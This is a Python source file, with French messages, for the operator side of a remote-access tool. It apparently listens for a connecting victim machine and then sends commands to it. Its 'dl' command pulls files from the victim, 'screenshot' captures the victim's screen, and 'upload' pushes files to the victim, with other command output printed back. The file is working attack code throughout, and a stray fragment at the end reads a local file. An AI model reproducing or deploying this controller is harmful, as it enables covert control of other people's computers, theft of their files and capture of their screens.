import socket

HOST_IP = ""
HOST_PORT = 3500
MAX_DATA_SIZE = 1024

def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None
    #print("socket_receive_all_data len:", data_len)
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(chunk_len)
        #print("     len:", len(data))
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        #print("     total len:", current_data_len, "/", data_len)
    return total_data

def socket_send_command_and_receive_all_data(socket_p, command):
    if not command:
        return
    
    socket_p.sendall(command.encode('ascii', errors='ignore'))
    
    header_data = socket_receive_all_data(socket_p, 13)
    longueur_data = int(header_data.decode('ascii', errors='ignore'))
    
    data_recues = socket_receive_all_data(socket_p, longueur_data)
    
    return data_recues
    


s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

print(f"Attente de connexion sur {HOST_IP}, port {HOST_PORT}...")
connection_socket, client_adress = s.accept()
print(f"Connexion établie avec {client_adress}")

while True:
    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")
    if not infos_data:
        break
    commande = input(client_adress[0] + ":" + str(client_adress[1]) + " " + infos_data.decode('ascii', errors='ignore') + " > ")
    
    commande_split = commande.split(" ")
    dl_filename = None
    # ------------------------------------------------------------------------------
    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_filename = commande_split[1]
    # ------------------------------------------------------------------------------
    elif len(commande_split) == 2 and commande_split[0] == "screenshot":
        dl_filename = commande_split[1] + ".png"
    # ------------------------------------------------------------------------------
    elif len(commande_split) == 2 and commande_split[0] == "upload":
        with open(commande_split[1], "rb") as file:
            file_data = file.read()
            file_data = file_data.decode('ascii', errors='ignore')
        commande = commande_split[0] + " " + commande_split[1] + " " + file_data
        file.close()
    # ------------------------------------------------------------------------------
        
    
    data_recues = socket_send_command_and_receive_all_data(connection_socket, commande)
    if not data_recues:
        break
    
    if dl_filename:
        if len(data_recues) == 1 and data_recues == b" ":
            print("Erreur: Le fichier", dl_filename, "n'existe pas")
        else:
            f = open(dl_filename, "wb")
            f.write(data_recues)
            f.close()
            print("Fichier", dl_filename, "téléchargé.")
        dl_filename = None
    else:
        print(data_recues.decode('ascii', errors='ignore'))
    
s.close()
connection_socket.close()

with open("local_file.txt", "rb") as file:
        # Read the file into a variable
        file_data = file.read()